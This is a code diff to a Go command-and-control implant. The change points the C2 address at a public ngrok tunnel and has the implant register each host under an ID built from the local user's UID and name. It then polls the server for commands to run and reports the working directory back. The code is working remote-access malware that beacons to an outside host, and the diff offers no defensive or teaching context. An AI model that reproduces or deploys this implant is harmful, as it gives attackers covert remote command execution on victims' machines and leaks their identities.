@@ -10,8 +10,11 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
 	"time"
+
+	"github.com/lithammer/shortuuid"
 )
 
 //ok
@@ -25,10 +28,18 @@ type Cmd struct {
 }
 
 var timeoutSetting = 3
-var c2 = "http://localhost:8005"
-var agent = "test"
+var c2 = "https://e49a4a48f45d.ngrok.io"
+
+//var agent = "test"
 
 func main() {
+	uuid := shortuuid.New()
+	user, err := user.Current()
+	agent := uuid + "_" + user.Uid + "_" + user.Name
+	createAgent(agent)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+	}
 	timeout := time.Duration(timeoutSetting) * time.Second
 	ticker := time.NewTicker(timeout)
 	quit := make(chan struct{})
@@ -41,6 +52,7 @@ func main() {
 			}
 			fmt.Println(path)
 			getJSON(c2 + "/api/cmds/" + agent)
+			updateAgentStatus(agent)
 		case <-quit:
 			return
 		}
@@ -79,16 +91,6 @@ func getJSON(url string) {
 
 }
 
-func execCmd(command string) error {
-
-	cmd := exec.Command(command)
-	cmd.Stderr = os.Stderr
-	cmd.Stdout = os.Stdout
-	//fmt.Fprintln(os.Stdout, output)
-	return cmd.Run()
-
-}
-
 func runCommand(commandStr string, cmdid string) error {
 	commandStr = strings.TrimSuffix(commandStr, "\n")
 	arrCommandStr := strings.Fields(commandStr)
@@ -100,12 +102,9 @@ func runCommand(commandStr string, cmdid string) error {
 		if len(arrCommandStr) < 1 {
 			return errors.New("Required 1 arguments")
 		}
-		path, err := os.Getwd()
-		if err != nil {
-			fmt.Println(err)
-		}
-		updateCmdStatus(cmdid, path)
-		return os.Chdir(arrCommandStr[1])
+		updateCmdStatus(cmdid, arrCommandStr[1])
+		os.Chdir(arrCommandStr[1])
+		return nil
 	case "exit":
 		os.Exit(0)
 	case "whos":
@@ -141,9 +140,23 @@ func updateCmdStatus(cmdid string, output string) {
 	}
 }
 
-func updateAgentStatus(cmdid string) {
-	resp, err := http.PostForm(c2+"/api/agent/status",
-		url.Values{"id": {cmdid}})
+func updateAgentStatus(agent string) {
+	dir, err := os.Getwd()
+	resp, err := http.PostForm(c2+"/api/agent/update",
+		url.Values{"working": {dir}, "agent": {agent}})
+
+	if err != nil {
+		panic(err)
+	}
+	if resp.Body != nil {
+		defer resp.Body.Close()
+	}
+}
+
+func createAgent(agent string) {
+	dir, err := os.Getwd()
+	resp, err := http.PostForm(c2+"/api/agent/create",
+		url.Values{"working": {dir}, "agent": {agent}})
 
 	if err != nil {
 		panic(err)
